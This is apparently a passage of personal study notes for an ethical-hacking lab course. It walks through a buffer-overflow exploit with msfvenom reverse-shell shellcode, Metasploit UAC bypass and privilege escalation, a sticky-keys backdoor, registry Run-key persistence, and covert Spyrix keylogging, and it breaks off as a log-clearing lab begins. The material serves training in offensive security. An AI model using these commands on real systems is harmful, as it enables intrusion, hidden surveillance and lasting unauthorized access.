+</p><p id="24c3addf-00cb-80f9-adea-c576b2a9a11d" class=""><strong>Buffer overflow: </strong>Common vulnerability in applications or programs that accept more data than the allocated buffer</p><ul id="24c3addf-00cb-808c-9fe9-e66e2cae2c41" class="bulleted-list"><li style="list-style-type:disc"> Leads to erratic system behavior, system crash, memory access errors, etc</li></ul><ul id="24c3addf-00cb-8024-b032-ce97704b4787" class="bulleted-list"><li style="list-style-type:disc">Attackers use this to inject malicious code into buffer</li></ul><p id="24c3addf-00cb-80c1-8530-c28da3a1c76b" class="">
+</p><p id="24c3addf-00cb-80bb-96c7-c8f839738a37" class="">With vulnerable server running: </p><ol type="1" id="24c3addf-00cb-80ce-84e0-ea4e10d5f3cd" class="numbered-list" start="1"><li><em><strong>nc (netcat) -nv &lt;Target Server IP&gt; 9999 </strong></em></li></ol><ol type="1" id="24c3addf-00cb-8091-b034-d27326249ee0" class="numbered-list" start="2"><li>Generate spike templates and perform spiking<ol type="a" id="24c3addf-00cb-8034-9c2c-db5cd2ccd4b6" class="numbered-list" start="1"><li>Note:  Spike templates define the package formats used for communicating with the vulnerable server. They are useful for testing and identifying functions vulnerable to buffer overflow exploitation</li></ol></li></ol><ol type="1" id="24c3addf-00cb-8064-b645-c50f2f0eb0bd" class="numbered-list" start="3"><li>Create spike template for spiking on STATS function <ol type="a" id="24c3addf-00cb-805b-a771-f04f6c17e58d" class="numbered-list" start="1"><li><em><strong>pluma stats.spk</strong></em></li></ol><ol type="a" id="24c3addf-00cb-802a-84b1-cbad84d8618f" class="numbered-list" start="2"><li>In Text editor: <ol type="i" id="24c3addf-00cb-80ba-b165-d5c1b8cf9a67" class="numbered-list" start="1"><li><em><strong>s_readline()</strong></em><p id="24c3addf-00cb-802c-8d97-c5832facf84c" class=""><em><strong>s_string(”STATS “);</strong></em></p><p id="24c3addf-00cb-8000-8321-dc87317c5754" class=""><em><strong>s_string_variable(”0”);</strong></em></p></li></ol></li></ol></li></ol><ol type="1" id="24c3addf-00cb-8046-8284-d65bab57da53" class="numbered-list" start="4"><li>Send packages to vulnerable server<ol type="a" id="24c3addf-00cb-80d8-9e55-fa990eb67e33" class="numbered-list" start="1"><li><em><strong>generic_send_tcp &lt;Target Server IP&gt; 9999 stats.spk 0 0 </strong></em><ol type="i" id="24c3addf-00cb-8022-9750-ce3a81d0c1bf" class="numbered-list" start="1"><li>In this command 0 and 0 are the values of SKIPVAR and SKIPSTR</li></ol></li></ol></li></ol><ol type="1" id="24c3addf-00cb-80b7-863d-e15c7bcc5c49" class="numbered-list" start="5"><li>Generate spike template and perform spiking on the TRUN function</li></ol><ol type="1" id="24c3addf-00cb-80cc-8eb8-fa08a566ccb3" class="numbered-list" start="6"><li>Repeat same process with “TRUN” instead of STATS</li></ol><p id="24c3addf-00cb-80c1-89ff-d7f2e1e03660" class="">
+</p><p id="24c3addf-00cb-80fa-8880-cb9f937e473a" class="">If the Server’s process status is “Running” the server is not vulnerable to buffer overflow</p><p id="24c3addf-00cb-8074-8695-f2e05d31e0df" class="">
+</p><p id="24c3addf-00cb-80d6-ae72-ece2970170f1" class="">If the Server’s process status is “Pasued” the server IS vulnerable to buffer overflow:</p><ul id="24c3addf-00cb-8075-a0dc-f41f19215716" class="bulleted-list"><li style="list-style-type:disc">Overwrites stack registers such as EAX, ESP, EBP and IP </li></ul><ul id="24c3addf-00cb-809f-b0d2-e3350b250cea" class="bulleted-list"><li style="list-style-type:disc">Overwriting EIP register allows us to gain shell access to target system </li></ul><p id="24c3addf-00cb-80d4-919a-f5fb13866938" class="">
+</p><p id="24c3addf-00cb-8016-90cd-ccace622fd6d" class="">You can see fields overwritten with ASCII value of A: </p><figure id="24c3addf-00cb-80a4-8541-f3ca769f891b" class="image"><a href="image%2044.png"><img style="width:672px" src="image%2044.png"/></a></figure><p id="24c3addf-00cb-807e-9faf-e89e95ee9dde" class="">
+</p><p id="24c3addf-00cb-80e3-86ec-c4e152d70cb9" class="">After identifying buffer overflow vulnerability, perform fuzzing to attempt to override EIP register: </p><ol type="1" id="24c3addf-00cb-800e-b337-dfacc5be05f2" class="numbered-list" start="1"><li>Navigate to the Scripts folder path in the terminal</li></ol><ol type="1" id="24c3addf-00cb-808d-abf1-da47ddf8f0de" class="numbered-list" start="2"><li><em><strong>chmod +x fuzz.py</strong></em> to change the mode to execute the Python script</li></ol><ol type="1" id="24c3addf-00cb-8063-8f70-fe663371f787" class="numbered-list" start="3"><li><em><strong>./fuzz.py</strong></em></li></ol><ol type="1" id="24c3addf-00cb-80ea-8b2d-dd5cec7ff778" class="numbered-list" start="4"><li>Let run for a while</li></ol><ol type="1" id="24c3addf-00cb-80a6-98c6-fa7be75496bb" class="numbered-list" start="5"><li>Message appears stating ‘Fuzzing crashed vulnerable server at x bytes (in my scenario it was 11100)</li></ol><ol type="1" id="24c3addf-00cb-8031-9bec-c8618e7851cd" class="numbered-list" start="6"><li>Through fuzzing, we have understood that we can overwrite the EIP register with 1 to 5550 (half of where server failed) bytes of data. </li></ol><p id="24c3addf-00cb-8042-b728-fa136d55b8aa" class="">
+</p><ol type="1" id="24c3addf-00cb-80a4-9efd-f02765951cca" class="numbered-list" start="7"><li>Run <em><strong>pattern_create </strong></em>Ruby tool to generate random bytes of data <ol type="a" id="24c3addf-00cb-803c-b86a-d844055144f2" class="numbered-list" start="1"><li>Jump to root directory</li></ol><ol type="a" id="24c3addf-00cb-8070-bc7f-dfcce6e86547" class="numbered-list" start="2"><li><em><strong>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 10400</strong></em><ol type="i" id="24c3addf-00cb-8030-9e53-fea1e6b6f19b" class="numbered-list" start="1"><li><em><strong>-l: </strong></em>Specifies length (byte size) - specify nearest even-number value of byte size obtained in previous step</li></ol><ol type="i" id="24c3addf-00cb-80fb-9fd0-c983ba487d24" class="numbered-list" start="2"><li>Copy random byte size text</li></ol></li></ol><ol type="a" id="24c3addf-00cb-80b6-a8e8-f4cbd8eb3d19" class="numbered-list" start="3"><li><em><strong>pluma findoff.py</strong></em><ol type="i" id="24c3addf-00cb-808e-9dcc-eca6037882d1" class="numbered-list" start="1"><li>Replace code within “ “ under the offset varable with the randomly generate bytes</li></ol></li></ol><ol type="a" id="24c3addf-00cb-80b0-8722-fdf8319a0a32" class="numbered-list" start="4"><li><em><strong>chmod +x findoff.py</strong></em></li></ol><ol type="a" id="24c3addf-00cb-80a6-bdee-fe9b24f90238" class="numbered-list" start="5"><li><em><strong>./findoff.py</strong></em></li></ol><ol type="a" id="24c3addf-00cb-8092-95f5-d76273ef6bf4" class="numbered-list" start="6"><li>In immunity debugger we can see the EIP register is overwritten with random bytes (in this case 386F4337) - note this down </li></ol><ol type="a" id="24c3addf-00cb-80b2-a2b1-c32d3537d12d" class="numbered-list" start="7"><li><em><strong>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 10400 -q 386F4337</strong></em><ol type="i" id="24c3addf-00cb-8056-a5aa-ee2027c474bc" class="numbered-list" start="1"><li><em><strong>-q </strong></em>is the offset value </li></ol></li></ol><ol type="a" id="24c3addf-00cb-800d-857c-fc29f3341881" class="numbered-list" start="8"><li>Result appears showing that the EIP register is at an offset of 2003 bytes</li></ol></li></ol><ol type="1" id="24c3addf-00cb-80bc-9f07-ef91e39f0fec" class="numbered-list" start="8"><li>Run Python script to attempt to overwrite the EIP register <ol type="a" id="24c3addf-00cb-8034-998f-ccadd4c979d3" class="numbered-list" start="1"><li><em><strong>chmod +x overwrite.py</strong></em></li></ol><ol type="a" id="24c3addf-00cb-8050-8d8e-e6c11a67a7fd" class="numbered-list" start="2"><li><em><strong>./overwrite.py </strong></em>(this script is used to see if we can control the EIP register </li></ol><ol type="a" id="24c3addf-00cb-801c-9d18-de10cea73689" class="numbered-list" start="3"><li>EIP register will be overwritten</li></ol></li></ol><ol type="1" id="24c3addf-00cb-805d-80f1-fa01d5724a9d" class="numbered-list" start="9"><li>Note: Before injecting shellcode into EIP register - must identify bad characters that may cause issues in shellcode<ol type="a" id="24c3addf-00cb-80a2-bea2-cd381fe9c163" class="numbered-list" start="9"><li><em><strong>chmod +x badchars.py</strong></em></li></ol><ol type="a" id="24c3addf-00cb-808d-aec0-f9a9acd928dd" class="numbered-list" start="10"><li>Run <em><strong>./badchars.py </strong></em>to send badchars along with shellcode </li></ol><ol type="a" id="24c3addf-00cb-807c-be84-c5aa99d77e62" class="numbered-list" start="11"><li>In Immunity debugger - right click on ESP value &gt; Follow in Dump &gt; Check characters in left window </li></ol></li></ol><ol type="1" id="24c3addf-00cb-8055-ace1-f775be1c7dc8" class="numbered-list" start="10"><li>Idenfity module of vulnerable server lacking memory protection <ol type="a" id="24c3addf-00cb-804d-b991-cb979cf89dd9" class="numbered-list" start="1"><li>Do this using <em><strong>mona.py</strong></em></li></ol><ol type="a" id="24c3addf-00cb-8066-863a-d818ccbf123c" class="numbered-list" start="2"><li>Copy <em><strong><a href="http://mona.py">mona.py</a></strong></em><em><strong> </strong></em>into C:/Program Files (x86)/Immunity Inc/Immunity Debugger/PyCommands</li></ol><ol type="a" id="24c3addf-00cb-8094-ba50-c66c3d2163fc" class="numbered-list" start="3"><li>Type <em><strong>!mona modules</strong></em></li></ol><ol type="a" id="24c3addf-00cb-8027-88e5-e7835c7fce63" class="numbered-list" start="4"><li>Log data pop-up window appears - shows protection settings of various modules<ol type="i" id="24c3addf-00cb-8044-b275-f2b799af2e2b" class="numbered-list" start="1"><li>We can observe modules with no memory protection - in this case <strong>essfunc.dll</strong></li></ol><figure id="24c3addf-00cb-80ac-8c7d-f1300064fd07" class="image"><a href="image%2045.png"><img style="width:720px" src="image%2045.png"/></a></figure></li></ol></li></ol><p id="24c3addf-00cb-80e8-a01a-cf344af269d9" class="">
+</p><ol type="1" id="24c3addf-00cb-80d8-b6e7-e139f9465d6f" class="numbered-list" start="11"><li>Exploit essfunc.dll module to inject shellcode and take control of EIP register<ol type="a" id="24c3addf-00cb-8014-9977-dcd3187bb213" class="numbered-list" start="1"><li><em><strong>/home/attacker/converter.py</strong></em></li></ol><ol type="a" id="24c3addf-00cb-8043-a4aa-d817b46f6449" class="numbered-list" start="2"><li><em><strong>JMP ESP -</strong></em></li></ol><ol type="a" id="24c3addf-00cb-80a2-92a5-f43db2cdf20c" class="numbered-list" start="3"><li>Note Hex value</li></ol><ol type="a" id="24c3addf-00cb-80bc-a05c-d99d2ef63745" class="numbered-list" start="4"><li>In immunity debugger: <em><strong>!mona find -s “\xff\xe4” -m essfunc.dll </strong></em><ol type="i" id="24c3addf-00cb-80cd-a847-d01ceb5499bd" class="numbered-list" start="1"><li>x(1st 2 hex characters)\x(2nd 2 hex characters)</li></ol><ol type="i" id="24c3addf-00cb-8046-8708-f50e50c62eb8" class="numbered-list" start="2"><li>Return address of vulnerable module shown - here 0x625011.af</li></ol><ol type="i" id="24c3addf-00cb-80c9-ad70-ca7d937e51f2" class="numbered-list" start="3"><li>Relaunch </li></ol><ol type="i" id="24c3addf-00cb-80db-8292-c0ca0f8b62d5" class="numbered-list" start="4"><li>Lick ‘Go to address in Disassembler’ Icon </li></ol><ol type="i" id="24c3addf-00cb-806f-ac34-de0fd7ba5d5a" class="numbered-list" start="5"><li>Enter return address of vulnerable module (625011af)</li></ol><ol type="i" id="24c3addf-00cb-80ee-bd8c-f547a6e8992c" class="numbered-list" start="6"><li> Will be pointed to<strong> 625011af ESP</strong>; press<strong> F2</strong> to set up a breakpoint at the selected address<figure id="24c3addf-00cb-8039-8793-c5daf7d3fa14" class="image"><a href="image%2046.png"><img style="width:501.9618225097656px" src="image%2046.png"/></a></figure></li></ol></li></ol><ol type="a" id="24c3addf-00cb-8061-9ca8-cac6a44f9d8f" class="numbered-list" start="5"><li>In Linux machine terminal: <ol type="i" id="24c3addf-00cb-8055-8474-ce4d763d49b0" class="numbered-list" start="1"><li><em><strong>chmod +x jump.pu</strong></em></li></ol><ol type="i" id="24c3addf-00cb-80d6-865a-c8cfbe5371a0" class="numbered-list" start="2"><li><em><strong>./jump.py</strong></em></li></ol></li></ol><ol type="a" id="24c3addf-00cb-80a8-8d55-c426992f012c" class="numbered-list" start="6"><li>In Immunity Debugger - EIP register has now been overwritten with return address of vulnerable module (can control EIP register if target server has modules without proper memory protection settings) </li></ol><ol type="a" id="24c3addf-00cb-80d6-b538-d6f994b16d5a" class="numbered-list" start="7"><li>Generate shellcode<ol type="i" id="24c3addf-00cb-8031-86de-ff75fefda6e0" class="numbered-list" start="1"><li><em><strong>msfvenom -p windows/shell_reverse_tcp LHOST=[Local IP Address] LPORT=[Listening Port] EXITFUNC=thread -f c -a x86 -b “\x00” </strong></em></li></ol><ol type="i" id="24c3addf-00cb-8072-bde5-e4a4144ac66f" class="numbered-list" start="2"><li><strong>Note</strong>: Here, <strong>-p</strong>: payload,<strong> local IP address</strong>: 10.10.1.13,<strong> listening port</strong>: 4444, <strong>-f</strong>: filetype, <strong>-a</strong>: architecture,<strong> -b</strong>: bad character</li></ol><ol type="i" id="24c3addf-00cb-801c-a15a-d3cd42d6b4a6" class="numbered-list" start="3"><li>Copy code </li></ol><ol type="i" id="24c3addf-00cb-8034-adc8-c305a344c606" class="numbered-list" start="4"><li><em><strong>pluma shellcode.py</strong></em></li></ol><ol type="i" id="24c3addf-00cb-80de-890b-d5215138c0c4" class="numbered-list" start="5"><li>Paste code into file, type b at the beginning of every line to convert strings to bytes <figure id="24c3addf-00cb-80cc-a1f0-ef6a47010482" class="image"><a href="image%2047.png"><img style="width:486.97918701171875px" src="image%2047.png"/></a></figure></li></ol></li></ol><ol type="a" id="24c3addf-00cb-80ae-83ae-d6ac98bfa65c" class="numbered-list" start="8"><li>Run Netcat to listen on poret 4444<ol type="i" id="24c3addf-00cb-8014-a948-ffd81c73506e" class="numbered-list" start="1"><li><em><strong>nc -nvlp 4444</strong></em></li></ol></li></ol><ol type="a" id="24c3addf-00cb-8059-87d4-fee470aef812" class="numbered-list" start="9"><li>Switch terminals (or navigate to scripts folder) <ol type="i" id="24c3addf-00cb-8040-bc71-cf33cf3e9de9" class="numbered-list" start="1"><li><em><strong>chmod +x shellcode.py</strong></em></li></ol><ol type="i" id="24c3addf-00cb-80f7-94df-efb9365106d5" class="numbered-list" start="2"><li><em><strong>./shellcode.py</strong></em></li></ol></li></ol></li></ol><p id="24c3addf-00cb-8065-a41f-ee1406a4788c" class="">
+</p></div></details><p id="24c3addf-00cb-8096-a201-ced220aa67f2" class="">
+</p><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Lab 2: Perform Privilege Escalation to Gain Higher Privileges </summary><div class="indented"><h3 id="24c3addf-00cb-80b1-b60c-e181a1e7c2d8" class=""><em>Lab Objectives: </em></h3><p id="24c3addf-00cb-8052-b403-dd1e87cb0aea" class="">Escalate privileges by bypassing UAC and exploiting Sticky Keys<strong><br/></strong></p><p id="24c3addf-00cb-8094-9da3-cabdc55f0aa5" class="">Sticky keys can be used to obtain unauthenticated, privileged access to the machine</p><p id="24c3addf-00cb-805c-8367-e59e8e2a642a" class="">
+</p><ol type="1" id="24c3addf-00cb-8077-9de9-fba283961d94" class="numbered-list" start="1"><li><em><strong>msfconsole</strong></em></li></ol><ol type="1" id="24c3addf-00cb-8060-85b8-c79c061c3c0e" class="numbered-list" start="2"><li><em><strong>use exploit/multi/handler</strong></em></li></ol><ol type="1" id="24c3addf-00cb-8012-a96e-d52ff3c60566" class="numbered-list" start="3"><li><em><strong>set payload windows/meterpreter/reverse_tcp</strong></em></li></ol><ol type="1" id="24c3addf-00cb-8043-a0b8-e674f320f1d4" class="numbered-list" start="4"><li><em><strong>set lhost 10.10.1.13 </strong></em>(local IP)</li></ol><ol type="1" id="24c3addf-00cb-80aa-8889-e1206de9a1b0" class="numbered-list" start="5"><li><em><strong>set lport 444</strong></em></li></ol><ol type="1" id="24c3addf-00cb-80bb-b7f3-d8ded346a673" class="numbered-list" start="6"><li>Once Meterpreter session opened - can run commands to gather info<ol type="a" id="24c3addf-00cb-800d-81f6-fbd83153cce1" class="numbered-list" start="1"><li><em><strong>sysinfo - </strong></em>Computer name, OS, Domain </li></ol><ol type="a" id="24c3addf-00cb-80f0-96cc-f5d5abbd470a" class="numbered-list" start="2"><li><em><strong>getuid - </strong></em>Displays current user ID </li></ol></li></ol><ol type="1" id="24c3addf-00cb-8055-92df-fbf7f21afa8f" class="numbered-list" start="7"><li><em><strong>background - </strong></em>to background the current meterpreter session </li></ol><ol type="1" id="24c3addf-00cb-8043-a73b-f1dc94f2a338" class="numbered-list" start="8"><li><em><strong>search bypassuac - </strong></em>shows list of bypassuac modules</li></ol><ol type="1" id="24c3addf-00cb-80b6-8bbf-fc69dbba33c0" class="numbered-list" start="9"><li>Bypass Windows UAC via FodHelper Registry Key<ol type="a" id="24c3addf-00cb-80f7-b88c-e2c3e37ae154" class="numbered-list" start="1"><li><em><strong>use explopit/windows/local/bypassuac_fodhelper</strong></em></li></ol><ol type="a" id="24c3addf-00cb-80ac-8713-e178a274572b" class="numbered-list" start="2"><li><em><strong>set session 1 </strong></em></li></ol><ol type="a" id="24c3addf-00cb-8002-aad9-e7396a1b3416" class="numbered-list" start="3"><li><em><strong>show options</strong></em></li></ol><ol type="a" id="24c3addf-00cb-80b0-8128-d337913390f9" class="numbered-list" start="4"><li><em><strong>set LHOST &lt;LOCAL IP&gt; </strong></em></li></ol><ol type="a" id="24c3addf-00cb-8016-b518-d913913947c6" class="numbered-list" start="5"><li><em><strong>set TARGET 0 </strong></em></li></ol><ol type="a" id="24c3addf-00cb-8002-b57c-d85e5c8cd051" class="numbered-list" start="6"><li><em><strong>exploit</strong></em></li></ol></li></ol><ol type="1" id="24c3addf-00cb-80c7-9206-db700ae8ba8c" class="numbered-list" start="10"><li>Elevate privileges with <em><strong>getsystem -t 1 </strong></em><ol type="a" id="24c3addf-00cb-80c0-b29f-d1117cab8cee" class="numbered-list" start="1"><li><em><strong>getuid</strong></em></li></ol><ol type="a" id="24c3addf-00cb-80e6-8954-ef4133a64c8a" class="numbered-list" start="2"><li><em><strong>background </strong></em></li></ol></li></ol><ol type="1" id="24c3addf-00cb-800a-9253-ef693a7423a9" class="numbered-list" start="11"><li>Exploit sticky keys <ol type="a" id="24c3addf-00cb-8096-ad26-ff7d085ee799" class="numbered-list" start="1"><li><em><strong>post/windows/manage/sticky_keys</strong></em></li></ol><ol type="a" id="24c3addf-00cb-80ee-a0d2-fa1d03196734" class="numbered-list" start="2"><li><em><strong>sessions -i* </strong></em>(Lists sessions in meterpreter) </li></ol><ol type="a" id="24c3addf-00cb-80eb-9121-cfd8dc4e0be2" class="numbered-list" start="3"><li>Type <em><strong>set session 2 </strong></em>to set the privileged session as the current session </li></ol><ol type="a" id="24c3addf-00cb-80b9-acf1-f46dccf17068" class="numbered-list" start="4"><li><em><strong>exploit</strong></em></li></ol><ol type="a" id="24c3addf-00cb-80fa-8c29-fd82b9d66bb3" class="numbered-list" start="5"><li>‘Launch exploit at RDP or UAC prompt by pressing SHIFT 5 times’ </li></ol></li></ol><p id="24c3addf-00cb-8073-aec0-c36b43f6ab60" class="">
+</p><p id="24c3addf-00cb-805e-a8b9-c5cb9b6d94a3" class="">
+</p></div></details><p id="24c3addf-00cb-8035-822b-ec6eb64708f5" class="">
+</p><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Lab 3: <strong>Maintain Remote Access and Hide Malicious Activities</strong></summary><div class="indented"><h3 id="24c3addf-00cb-805b-a602-f2a60c206120" class=""><em>Lab Objectives:</em></h3><p id="24c3addf-00cb-8095-a842-c9502610baf1" class="">▪ User system monitoring and surveillance using Spyrix </p><p id="24c3addf-00cb-8077-bb4b-da1b3ce0444d" class="">▪ Maintain persistence by modifying registry run keys<br/></p><p id="24c3addf-00cb-8077-9f1b-e26910c2fb56" class="">Discussed below are some of the remote code execution techniques: </p><p id="24c3addf-00cb-8082-a1c5-e6a8f7573ed2" class="">▪ Exploitation for client execution ▪ Scheduled task ▪ Service execution<br/></p><p id="24c3addf-00cb-8076-a772-c2df2bd45020" class=""><strong>Hiding Files:</strong> </p><p id="24c3addf-00cb-80b2-88b7-f214a3637557" class="">Hiding files is the process of hiding malicious programs using methods such as rootkits, NTFS streams, and steganography techniques to prevent the malicious programs from being detected by protective applications </p><p id="24c3addf-00cb-8097-b216-c472769b9dd7" class="">
+</p><h3 id="24c3addf-00cb-8063-8932-d9cd6491d1b8" class="">Task 1: User System Monitoring and Surveillance using Spyrix </h3><p id="24c3addf-00cb-80f1-8d85-d17a275a3a06" class=""><strong>Spyrix </strong>facilitates covert r<strong>emote monitoring of user activities in real-time</strong>. It provides concealed surveillance via a secure web account, logging keystrokes with a keylogger, monitoring various platforms (Facebook, WhatsApp, Skype, Email) </p><p id="24c3addf-00cb-80ea-9787-cacf89cedb15" class="">Capturing screenshots, live viewing of screen and webcam feeds, continuous recording of screen and webcam activity</p><p id="24c3addf-00cb-8007-9f0a-c2c3cf4800e1" class="">
+</p><ol type="1" id="24c3addf-00cb-8023-a8cf-f51e29151c95" class="numbered-list" start="1"><li>Install Spyrix</li></ol><ol type="1" id="24c3addf-00cb-8038-896a-d12eb8b09f51" class="numbered-list" start="2"><li>RDP to Target Machine using credentials gained from previous lab </li></ol><ol type="1" id="24c3addf-00cb-8045-99aa-f07cd531fb3a" class="numbered-list" start="3"><li>Install Syprix on Target Machine</li></ol><ol type="1" id="24c3addf-00cb-8083-835a-f75b459b0513" class="numbered-list" start="4"><li>Use UI to view keylogs, screenshots, events, etc. </li></ol><p id="24c3addf-00cb-8008-ad9e-e12f73fbd30c" class="">
+</p><h3 id="24c3addf-00cb-80b9-bb6a-d54f16ebab74" class="">Task 2: Maintain Persistence by Modifying Registry Run Keys </h3><p id="24c3addf-00cb-803b-a1dd-eb9f5397b2c3" class=""><strong>Registry keys</strong> labeled as <strong>Run </strong>and <strong>RunOnce </strong>are automatically run programs upon each user login to the system</p><p id="24c3addf-00cb-80b2-927b-cd666d7b6c9d" class="">
+</p><p id="24c3addf-00cb-80ac-bbcb-ebdae10cc3bc" class="">If attackers discover a service connected to a registry key with full permissions, they can <strong>execute persistence attacks or exploit privilege escalation</strong>. Upon any authorized user&#x27;s login attempt, the associated service link within the registry triggers automatically</p><p id="24c3addf-00cb-8010-b314-fc1b669886f8" class="">
+</p><ol type="1" id="24c3addf-00cb-806e-b87c-fe6e3513e136" class="numbered-list" start="1"><li>Generate a test payload: <ol type="a" id="24d3addf-00cb-8036-9edf-ee0bac2932be" class="numbered-list" start="1"><li><em><strong>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe &gt; /home/attacker/Desktop/Test.exe </strong></em></li></ol></li></ol><ol type="1" id="24d3addf-00cb-8051-bd01-c0368a2b02df" class="numbered-list" start="2"><li>Generate payload to be uploaded into Run Registry of Windows 11 machine<ol type="a" id="24d3addf-00cb-80c2-af7a-f756ee7c61e8" class="numbered-list" start="1"><li><em><strong>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=4444 -f exe &gt; /home/attacker/Desktop/registry.exe</strong></em></li></ol></li></ol><ol type="1" id="24d3addf-00cb-8098-a3f4-d6c997dffcc7" class="numbered-list" start="3"><li>These payloads somehow need to be executed on the target machine </li></ol><ol type="1" id="24d3addf-00cb-804a-9ac4-fb404fab24ed" class="numbered-list" start="4"><li><em><strong>msfconsole</strong></em></li></ol><ol type="1" id="24d3addf-00cb-804f-84c6-e846b9a386ed" class="numbered-list" start="5"><li><em><strong>use exploit/multi/handler</strong></em></li></ol><ol type="1" id="24d3addf-00cb-80b4-b341-c49bcc00f1d5" class="numbered-list" start="6"><li><em><strong>set payload windows/meterpreter/reverse_tcp</strong></em></li></ol><ol type="1" id="24d3addf-00cb-8068-83c7-d6a863b5b992" class="numbered-list" start="7"><li><em><strong>set lhost &lt;local host&gt;</strong></em></li></ol><ol type="1" id="24d3addf-00cb-809e-94e2-f5db18aa8d43" class="numbered-list" start="8"><li><em><strong>set lport 444</strong></em></li></ol><ol type="1" id="24d3addf-00cb-800f-8213-f21ab3d1b99e" class="numbered-list" start="9"><li><em><strong>run</strong></em></li></ol><ol type="1" id="24d3addf-00cb-80c7-b8a3-c20f4abf2f56" class="numbered-list" start="10"><li>Execute payload Test.exe on target machine</li></ol><ol type="1" id="24d3addf-00cb-805c-b3cf-e7e9a087d63f" class="numbered-list" start="11"><li>Session now opened</li></ol><ol type="1" id="24d3addf-00cb-8017-bf91-f2d448453c75" class="numbered-list" start="12"><li>In meterpreter session - <em><strong>getuid - </strong></em>to get current user ID </li></ol><ol type="1" id="24d3addf-00cb-8055-a64b-e5337eb879c7" class="numbered-list" start="13"><li>Attempt to bypass UAC using SilentCleanup task present in Windows Task Scheduler<ol type="a" id="24d3addf-00cb-80ae-89f4-df7db38fbefd" class="numbered-list" start="1"><li><em><strong>backgroung</strong></em></li></ol><ol type="a" id="24d3addf-00cb-8067-8dd8-fcbad3f6c276" class="numbered-list" start="2"><li><em><strong>use exploit/windows/local/bypassuac_silentcleanup</strong></em></li></ol><ol type="a" id="24d3addf-00cb-8055-bb2b-f39e2a22df15" class="numbered-list" start="3"><li><em><strong>set session 1</strong></em></li></ol><ol type="a" id="24d3addf-00cb-8094-bccc-fd0f8b12a0df" class="numbered-list" start="4"><li><em><strong>show options</strong></em></li></ol><ol type="a" id="24d3addf-00cb-80d7-85d7-f7f140cc438c" class="numbered-list" start="5"><li><em><strong>set LHOST &lt;local host&gt;</strong></em></li></ol><ol type="a" id="24d3addf-00cb-8021-9046-f7b2b963e3ec" class="numbered-list" start="6"><li><em><strong>set TARGET 0</strong></em></li></ol><ol type="a" id="24d3addf-00cb-8078-b62d-f8a5dcecfe1d" class="numbered-list" start="7"><li><em><strong>exploit</strong></em></li></ol><ol type="a" id="24d3addf-00cb-80bf-a9e1-d0b0818715d3" class="numbered-list" start="8"><li><strong>Note:</strong><em><strong> </strong></em>If you get Exploit completed, but no session was created message without any session, type exploit in the console again and press Enter</li></ol></li></ol><ol type="1" id="24d3addf-00cb-80e3-8cbd-c64e41114737" class="numbered-list" start="14"><li>The BypassUAC exploit has successfully bypassed the UAC setting on the Windows 11 machine</li></ol><ol type="1" id="24d3addf-00cb-80b2-8b11-ec68fa1b3c7d" class="numbered-list" start="15"><li><em><strong>getsystem -t 1 - </strong></em>to elevate priveleges </li></ol><ol type="1" id="24d3addf-00cb-8049-b392-cea90092b916" class="numbered-list" start="16"><li><em><strong>getuid</strong></em> to see that we now have system privileges </li></ol><ol type="1" id="24d3addf-00cb-8069-a32b-cc52ee10fce2" class="numbered-list" start="17"><li>Add the malicious file into the Windows 11 machine&#x27;s registry - open a shell by running the shell command<ol type="a" id="24d3addf-00cb-8034-8b9e-d5371b7be67c" class="numbered-list" start="1"><li><em><strong>reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_EXPAND_SZ /d &quot;C:\Users\Admin\Downloads\registry.exe&quot; </strong></em></li></ol></li></ol><ol type="1" id="24d3addf-00cb-80e0-911c-ee6165aaa307" class="numbered-list" start="18"><li>Once the command is successfully executed, open another terminal window with root privileges and run <em><strong>msfconsole</strong></em> command<ol type="a" id="24d3addf-00cb-80e7-b630-dde031319c81" class="numbered-list" start="1"><li><em><strong>use exploit/multi/handler </strong></em></li></ol><ol type="a" id="24d3addf-00cb-808e-94c3-f541994258e8" class="numbered-list" start="2"><li><em><strong>set payload windows/meterpreter/reverse_tcp </strong></em></li></ol><ol type="a" id="24d3addf-00cb-80f2-b95f-ef1e4730ce58" class="numbered-list" start="3"><li><em><strong>set lhost &lt;local host&gt; </strong></em></li></ol><ol type="a" id="24d3addf-00cb-80d5-b4b2-ecc5d43780c4" class="numbered-list" start="4"><li><em><strong>set lport 4444</strong></em></li></ol><ol type="a" id="24d3addf-00cb-801c-8958-c34f6693479f" class="numbered-list" start="5"><li><em><strong>exploit</strong></em></li></ol></li></ol><ol type="1" id="24d3addf-00cb-80bc-bbea-c9af414243b6" class="numbered-list" start="19"><li>Whenever the Admin restarts the system, a reverse shell is opened to the attacker until the payload is detected by the administrator - allowing us to maintain persistence </li></ol><p id="24c3addf-00cb-8024-bab6-f16073f33d49" class="">
+</p></div></details><p id="24d3addf-00cb-8013-a2d9-ff704518a3ad" class="">
+</p><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Lab 4: Clear Logs to Hide the Evidence of Compromise</summary><div class="indented"><p id="24d3addf-00cb-80a1-ae65-ee3b2c122d31" class=""><strong>▪ Disable Auditing</strong>: Disable the auditing features of the target system </p><p id="24d3addf-00cb-80a4-8196-dd3f2bdc288a" class=""><strong>▪ Clearing Logs:</strong> Clears and deletes the system log entries corresponding to security compromise activities<br/><strong>▪ Manipulating Logs:</strong> Manipulate logs in such a way that an intruder will not be caught in illegal actions<br/><strong>▪ Covering Tracks on the Network</strong>: Use techniques such as reverse HTTP shells, reverse ICMP tunnels, DNS tunneling, and TCP parameters to cover tracks on the network.<br/><strong>▪ Covering Tracks on the OS:</strong> Use NTFS streams to hide and cover malicious files in the target system<br/><strong>▪ Deleting Files:</strong> Use command-line tools such as Cipher.exe to delete the data and prevent its future recovery<br/><strong>▪ Disabling Windows Functionality:</strong> Disable Windows functionality such as last access timestamp, Hibernation, virtual memory, and system restore points to cover tracks<br/></p><h3 id="24d3addf-00cb-80cc-abc4-f7db1353e09c" class="">Task 1: Clear Windows Machine Logs using Various Utilities </h3><p id="24d3addf-00cb-8067-917d-e84a053d1081" class="">
